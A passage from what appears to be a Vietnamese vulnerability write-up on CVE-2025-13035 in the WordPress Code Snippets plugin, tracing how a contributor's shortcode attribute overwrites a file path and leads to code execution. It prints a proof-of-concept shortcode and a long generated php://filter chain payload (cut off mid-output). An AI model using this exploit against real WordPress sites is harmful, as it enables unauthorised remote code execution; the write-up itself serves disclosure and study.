</span></span><span class="line"><span class="cl">    <span class="nv">$atts</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">convert_boolean_attribute_flags</span><span class="p">(</span> <span class="nv">$atts</span><span class="p">,</span> <span class="p">[</span> <span class="s1">&#39;network&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;format&#39;</span><span class="p">,</span> <span class="s1">&#39;shortcodes&#39;</span><span class="p">,</span> <span class="s1">&#39;debug&#39;</span> <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$original_atts</span> <span class="o">=</span> <span class="nv">$atts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$atts</span> <span class="o">=</span> <span class="nx">shortcode_atts</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;id&#39;</span>         <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;snippet_id&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;network&#39;</span>    <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;php&#39;</span>        <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;format&#39;</span>     <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;shortcodes&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;debug&#39;</span>      <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$atts</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="o">::</span><span class="na">CONTENT_SHORTCODE</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">!==</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$atts</span><span class="p">[</span><span class="s1">&#39;snippet_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$atts</span><span class="p">[</span><span class="s1">&#39;snippet_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$atts</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$id</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invalid_id_warning</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="nv">$snippet</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_snippet</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="nv">$atts</span><span class="p">[</span><span class="s1">&#39;network&#39;</span><span class="p">],</span> <span class="s1">&#39;html&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Render the source code if this is not a shortcode snippet.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="s1">&#39;content&#39;</span> <span class="o">!==</span> <span class="nv">$snippet</span><span class="o">-&gt;</span><span class="na">scope</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$snippet</span><span class="o">-&gt;</span><span class="na">id</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">render_snippet_source</span><span class="p">(</span> <span class="nv">$snippet</span> <span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invalid_id_warning</span><span class="p">(</span> <span class="nv">$snippet</span><span class="o">-&gt;</span><span class="na">id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evaluate_shortcode_content</span><span class="p">(</span> <span class="nv">$snippet</span><span class="p">,</span> <span class="nv">$original_atts</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm tạo ra một đối tượng <strong>Snippet</strong> bằng cách gọi phương thức <code>get_snippet</code>. Phương thức nhận vào ba tham số: ID của snippet, giá trị boolean cho biết có sử dụng chế độ <strong>network</strong> hay không, và định dạng mong muốn (<strong>html</strong>). Kết quả trả về là một đối tượng <strong>Snippet</strong> chứa toàn bộ thông tin cần thiết để tiếp tục xử lý.</p>
<p>Tiếp theo, hàm kiểm tra phạm vi (<strong>scope</strong>) của snippet. Nếu snippet <strong>không</strong> thuộc loại <strong>content</strong> (<code>html</code>)
<figure><a class="lightgallery" href="/posts/2025-11-27-cve-2025-13035/content.png" title="Content khi tạo Snippet" data-thumbnail="/posts/2025-11-27-cve-2025-13035/content.png" data-sub-html="<h2>Content</h2><p>Content khi tạo Snippet</p>"><img loading="lazy" src='/posts/2025-11-27-cve-2025-13035/content.png' alt="Content" height="549" width="1036"></a><figcaption class="image-caption">Content khi tạo Snippet</figcaption>
  </figure>
plugin sẽ không xử lý nội dung mà thay vào đó trả về phần mã nguồn của snippet.</p>
<p>Hàm <code>evaluate_shortcode_content()</code> được gọi để xử lý nội dung shortcode:</p>
<div class="highlight" title="class-front-end.php v3.9.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="hl"><span class="lnt">15
</span></span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">evaluate_shortcode_content</span><span class="p">(</span> <span class="nx">Snippet</span> <span class="nv">$snippet</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$atts</span> <span class="p">)</span><span class="o">:</span> <span class="nx">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$atts</span><span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$snippet</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">Snippet_Files</span><span class="o">::</span><span class="na">is_active</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evaluate_shortcode_from_db</span><span class="p">(</span> <span class="nv">$snippet</span><span class="p">,</span> <span class="nv">$atts</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$network</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">validate_network_param</span><span class="p">(</span> <span class="nv">$snippet</span><span class="o">-&gt;</span><span class="na">network</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$table_name</span> <span class="o">=</span> <span class="nx">Snippet_Files</span><span class="o">::</span><span class="na">get_hashed_table_name</span><span class="p">(</span> <span class="nx">code_snippets</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_table_name</span><span class="p">(</span> <span class="nv">$network</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filepath</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">build_snippet_flat_file_path</span><span class="p">(</span> <span class="nv">$table_name</span><span class="p">,</span> <span class="nv">$snippet</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$filepath</span> <span class="p">)</span>
</span></span><span class="line hl"><span class="cl">        <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evaluate_shortcode_from_flat_file</span><span class="p">(</span> <span class="nv">$filepath</span><span class="p">,</span> <span class="nv">$atts</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evaluate_shortcode_from_db</span><span class="p">(</span> <span class="nv">$snippet</span><span class="p">,</span> <span class="nv">$atts</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm kiểm tra xem thuộc tính <code>php</code> có tồn tại hay không. Nếu không, trả về mã nguồn gốc của snippet mà không thực thi.
Nếu thuộc tính <code>php</code> tồn tại nhưng file lưu trữ chưa tồn tại, hàm chuyển sang phương thức xử lý trực tiếp từ cơ sở dữ liệu.</p>
<p>File lưu trữ được khai báo:</p>
<div class="highlight" title="class-snippet-files.php v3.9.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">const</span> <span class="no">ENABLED_FLAG_FILE</span> <span class="o">=</span> <span class="s1">&#39;flat-files-enabled.flag&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Để hàm không return ở đây, ta phải bật option <code>Enable file-based execution</code> trong admin panel:</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-27-cve-2025-13035/enable.png" title="Enable file-based execution" data-thumbnail="/posts/2025-11-27-cve-2025-13035/enable.png" data-sub-html="<h2>Enable</h2><p>Enable file-based execution</p>"><img loading="lazy" src='/posts/2025-11-27-cve-2025-13035/enable.png' alt="Enable" height="810" width="982"></a><figcaption class="image-caption">Enable file-based execution</figcaption>
  </figure></p>
<p>Khi đó file lưu trữ được tạo nằm trong <code>wp-content/code-snippets</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-27-cve-2025-13035/file.png" title="flat-files-enabled.flag được tạo" data-thumbnail="/posts/2025-11-27-cve-2025-13035/file.png" data-sub-html="<h2>File</h2><p>flat-files-enabled.flag được tạo</p>"><img loading="lazy" src='/posts/2025-11-27-cve-2025-13035/file.png' alt="File" height="253" width="561"></a><figcaption class="image-caption">flat-files-enabled.flag được tạo</figcaption>
  </figure></p>
<p>Khi file đã tồn tại, hàm tiến hành xác định thông tin mạng của snippet, lấy tên bảng đã được băm (hash) và xây dựng đường dẫn đến file chứa nội dung của snippet gán vào <code>$filepath</code>.</p>
<p>Nếu <code>$filepath</code> tồn tại hàm gọi đến <code>evaluate_shortcode_from_flat_file( $filepath, $atts )</code> nơi xảy ra lỗ hổng.</p>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Thông tin</div>
  <div class="details-content">
    <div class="admonition-content"><p>Lổ hổng được công bố với đặc quyền Contributor vì đây là đặc quyền thấp nhất để chèn shortcode vào post</p></div>
  </div>
</div><h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">
graph TD

A["Contributor inserts [code_snippet] shortcode"] --> B["WordPress calls render_content_shortcode()"]
B --> C["convert_boolean_attribute_flags()"]
C --> D["shortcode_atts(): merge defaults into $atts"]
D --> E["Determine snippet_id → if invalid → invalid_id_warning()"]

E --> F["get_snippet(id, network, 'html') → create Snippet object"]
F --> G{"snippet.scope == 'content'?"}

G -- No --> H["render_snippet_source()"]
H --> Z["End"]

G -- Yes --> I["evaluate_shortcode_content(snippet, original_atts)"]

I --> J{"original_atts['php'] enabled?"}
J -- No --> K["Return snippet->code"] --> Z

J -- Yes --> L{"Snippet_Files::is_active()?"}

L -- No --> M["evaluate_shortcode_from_db()"] --> Z

L -- Yes --> N["Build file path: build_snippet_flat_file_path()"]
N --> O{"Does file exist?"}

O -- No --> M

O -- Yes --> P["evaluate_shortcode_from_flat_file(filepath, atts)"]

P --> Q["extract(atts) inside IIFE"]
Q --> R{"Do atts contain variable-name collisions (e.g., 'filepath')?"}

R -- No --> S["require_once filepath (safe)"] --> Z

R -- Yes --> T["Internal variable overwritten → filepath replaced"]
T --> U["require_once attacker-controlled file"]
U --> V["RCE achieved"]
V --> Z
</pre>
  <pre class="mermaid-dark">
graph TD

A["Contributor inserts [code_snippet] shortcode"] --> B["WordPress calls render_content_shortcode()"]
B --> C["convert_boolean_attribute_flags()"]
C --> D["shortcode_atts(): merge defaults into $atts"]
D --> E["Determine snippet_id → if invalid → invalid_id_warning()"]

E --> F["get_snippet(id, network, 'html') → create Snippet object"]
F --> G{"snippet.scope == 'content'?"}

G -- No --> H["render_snippet_source()"]
H --> Z["End"]

G -- Yes --> I["evaluate_shortcode_content(snippet, original_atts)"]

I --> J{"original_atts['php'] enabled?"}
J -- No --> K["Return snippet->code"] --> Z

J -- Yes --> L{"Snippet_Files::is_active()?"}

L -- No --> M["evaluate_shortcode_from_db()"] --> Z

L -- Yes --> N["Build file path: build_snippet_flat_file_path()"]
N --> O{"Does file exist?"}

O -- No --> M

O -- Yes --> P["evaluate_shortcode_from_flat_file(filepath, atts)"]

P --> Q["extract(atts) inside IIFE"]
Q --> R{"Do atts contain variable-name collisions (e.g., 'filepath')?"}

R -- No --> S["require_once filepath (safe)"] --> Z

R -- Yes --> T["Internal variable overwritten → filepath replaced"]
T --> U["require_once attacker-controlled file"]
U --> V["RCE achieved"]
V --> Z
</pre>
  <pre class="mermaid-neutral">
graph TD

A["Contributor inserts [code_snippet] shortcode"] --> B["WordPress calls render_content_shortcode()"]
B --> C["convert_boolean_attribute_flags()"]
C --> D["shortcode_atts(): merge defaults into $atts"]
D --> E["Determine snippet_id → if invalid → invalid_id_warning()"]

E --> F["get_snippet(id, network, 'html') → create Snippet object"]
F --> G{"snippet.scope == 'content'?"}

G -- No --> H["render_snippet_source()"]
H --> Z["End"]

G -- Yes --> I["evaluate_shortcode_content(snippet, original_atts)"]

I --> J{"original_atts['php'] enabled?"}
J -- No --> K["Return snippet->code"] --> Z

J -- Yes --> L{"Snippet_Files::is_active()?"}

L -- No --> M["evaluate_shortcode_from_db()"] --> Z

L -- Yes --> N["Build file path: build_snippet_flat_file_path()"]
N --> O{"Does file exist?"}

O -- No --> M

O -- Yes --> P["evaluate_shortcode_from_flat_file(filepath, atts)"]

P --> Q["extract(atts) inside IIFE"]
Q --> R{"Do atts contain variable-name collisions (e.g., 'filepath')?"}

R -- No --> S["require_once filepath (safe)"] --> Z

R -- Yes --> T["Internal variable overwritten → filepath replaced"]
T --> U["require_once attacker-controlled file"]
U --> V["RCE achieved"]
V --> Z
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD

A["Contributor inserts [code_snippet] shortcode"] --> B["WordPress calls render_content_shortcode()"]
B --> C["convert_boolean_attribute_flags()"]
C --> D["shortcode_atts(): merge defaults into $atts"]
D --> E["Determine snippet_id → if invalid → invalid_id_warning()"]

E --> F["get_snippet(id, network, 'html') → create Snippet object"]
F --> G{"snippet.scope == 'content'?"}

G -- No --> H["render_snippet_source()"]
H --> Z["End"]

G -- Yes --> I["evaluate_shortcode_content(snippet, original_atts)"]

I --> J{"original_atts['php'] enabled?"}
J -- No --> K["Return snippet->code"] --> Z

J -- Yes --> L{"Snippet_Files::is_active()?"}

L -- No --> M["evaluate_shortcode_from_db()"] --> Z

L -- Yes --> N["Build file path: build_snippet_flat_file_path()"]
N --> O{"Does file exist?"}

O -- No --> M

O -- Yes --> P["evaluate_shortcode_from_flat_file(filepath, atts)"]

P --> Q["extract(atts) inside IIFE"]
Q --> R{"Do atts contain variable-name collisions (e.g., 'filepath')?"}

R -- No --> S["require_once filepath (safe)"] --> Z

R -- Yes --> T["Internal variable overwritten → filepath replaced"]
T --> U["require_once attacker-controlled file"]
U --> V["RCE achieved"]
V --> Z
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Administrator bật option <code>Enable file-based execution</code></li>
<li>Contributor chèn shortcode sau vào post với <code>snippet_id</code> trỏ đến Snippet có Snippet Type là HTML(<code>content</code>)</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[code_snippet snippet_id=4 php=1 filepath=/path/to/file]</span></span></code></pre></td></tr></table>
</div>
</div><p>Ở đây attacker có toàn quyền điều khiển giá trị của biến <code>filepath</code>. Điều đó cho phép sử dụng các PHP stream wrappers (chẳng hạn filter chain) để dẫn tới thực thi mã, vì:</p>
<ul>
<li><code>require_once</code> chỉ kiểm tra xem chuỗi nhận vào có phải là một đường dẫn hợp lệ theo PHP hay không; nó sẽ cố gắng nạp <strong>bất kỳ</strong> stream nào được cung cấp mà không giới hạn ở file vật lý.</li>
<li>PHP filter chain cho phép biến đổi nội dung stream và khiến PHP diễn giải kết quả cuối cùng như mã PHP hợp lệ. Khi nội dung sau filter được đưa vào <code>require_once</code>, PHP sẽ thực thi nó.</li>
<li>Nhiều wrapper như <code>http://</code> hoặc <code>ftp://</code> bị hạn chế bởi cấu hình mặc định <code>allow_url_include</code>, nhưng các wrapper nội bộ như <code>php://filter</code> không bị ảnh hưởng bởi giới hạn này.</li>
</ul>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Thông tin</div>
  <div class="details-content">
    <div class="admonition-content"><p><strong>Filter chain</strong> trong PHP là cơ chế cho phép bạn nối nhiều bộ lọc (stream filters) lại với nhau để xử lý dữ liệu khi đọc hoặc ghi từ một file/stream. Nó hoạt động dựa trên wrapper đặc biệt: <code>php://filter</code>.</p>
<p>Kỹ thuật này được sử dụng trong các cuộc thi CTF, dựa trên nguyên lý sau:</p>
<ul>
<li><code>php://filter</code>: cho phép gắn filter vào một stream (ở đây là <code>php://temp</code>).</li>
<li>Chuỗi filter: các filter được nối bằng ký tự <code>|</code>. Dữ liệu đi qua từng filter theo thứ tự từ trái sang phải.</li>
<li>Các filter chính trong chuỗi:
<ul>
<li><code>convert.iconv.&lt;from&gt;</code>.<code>&lt;to&gt;</code>: chuyển đổi encoding từ bộ mã này sang bộ mã khác.</li>
<li><code>convert.base64-encode</code> / <code>convert.base64-decode</code>: mã hóa hoặc giải mã base64.</li>
</ul>
</li>
</ul>
<p>Khi kết hợp hàng chục filter như vậy, dữ liệu sẽ bị biến đổi nhiều lần: encode → đổi encoding → decode → encode → … cho đến cuối cùng.
Tham khảo: <a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it"target="_blank" rel="external nofollow noopener noreferrer">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it</a></p></div>
  </div>
</div><p>Chạy <a href="https://github.com/synacktiv/php_filter_chain_generator/tree/main"target="_blank" rel="external nofollow noopener noreferrer">script</a> sau để tạo PHP Filter Chain:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;  &#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The following gadget chain will generate the following code : &lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;   <span class="o">(</span>base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg<span class="o">)</span>
</span></span><span class="line"><span class="cl">php://filter/convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM921.NAPLPS<span class="p">|</span>convert.iconv.855.CP936<span class="p">|</span>convert.iconv.IBM-932.UTF-8<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.8859_3.UTF16<span class="p">|</span>convert.iconv.863.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.DEC.UTF-16<span class="p">|</span>convert.iconv.ISO8859-9.ISO_6937-2<span class="p">|</span>convert.iconv.UTF16.GB13000<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.IBM869.UTF16<span class="p">|</span>convert.iconv.L3.CSISO90<span class="p">|</span>convert.iconv.UCS2.UTF-8<span class="p">|</span>convert.iconv.CSISOLATIN6.UCS-4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.8859_3.UTF16<span class="p">|</span>convert.iconv.863.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.851.UTF-16<span class="p">|</span>convert.iconv.L1.T.618BIT<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CSA_T500.UTF-32<span class="p">|</span>convert.iconv.CP857.ISO-2022-JP-3<span class="p">|</span>convert.iconv.ISO2022JP2.CP775<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.IBM891.CSUNICODE<span class="p">|</span>convert.iconv.ISO8859-14.ISO6937<span class="p">|</span>convert.iconv.BIG-FIVE.UCS-4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM921.NAPLPS<span class="p">|</span>convert.iconv.855.CP936<span class="p">|</span>convert.iconv.IBM-932.UTF-8<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.851.UTF-16<span class="p">|</span>convert.iconv.L1.T.618BIT<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.JS.UNICODE<span class="p">|</span>convert.iconv.L4.UCS2<span class="p">|</span>convert.iconv.UCS-2.OSF00030010<span class="p">|</span>convert.iconv.CSIBM1008.UTF32BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM921.NAPLPS<span class="p">|</span>convert.iconv.CP1163.CSA_T500<span class="p">|</span>convert.iconv.UCS-2.MSCP949<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.UTF8.UTF16LE<span class="p">|</span>convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.iconv.UTF16.EUCTW<span class="p">|</span>convert.iconv.8859_3.UCS2<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP1046.UTF32<span class="p">|</span>convert.iconv.L6.UCS-2<span class="p">|</span>convert.iconv.UTF-16LE.T.61-8BIT<span class="p">|</span>convert.iconv.865.UCS-4LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.MAC.UTF16<span class="p">|</span>convert.iconv.L8.UTF16BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CSGB2312.UTF-32<span class="p">|</span>convert.iconv.IBM-1161.IBM932<span class="p">|</span>convert.iconv.GB13000.UTF16BE<span class="p">|</span>convert.iconv.864.UTF-32LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L6.UNICODE<span class="p">|</span>convert.iconv.CP1282.ISO-IR-90<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L4.UTF32<span class="p">|</span>convert.iconv.CP1250.UCS-2<span 